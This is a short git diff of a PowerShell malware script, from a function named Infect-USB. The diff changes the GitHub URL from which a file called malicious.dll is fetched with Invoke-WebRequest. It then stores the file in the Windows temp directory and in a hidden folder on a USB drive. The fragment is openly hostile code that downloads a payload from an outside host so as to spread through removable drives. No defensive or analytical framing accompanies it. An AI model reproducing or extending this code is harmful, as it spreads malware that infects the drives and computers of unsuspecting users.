@@ -80,7 +80,7 @@ function Infect-USB {
         # Download malicious DLL
         $dllPath = "C:\Windows\Temp\malicious.dll"
         $usbDllPath = "$hiddenFolder\malicious.dll"
-        $dllUrl = "https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/refs/heads/main/malicious.dll"
+        $dllUrl = "https://github.com/NaomiMendoza127/maliciousdll/raw/refs/heads/main/malicious.dll"
         if (-not (Test-Path $dllPath)) {
             try {
                 Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
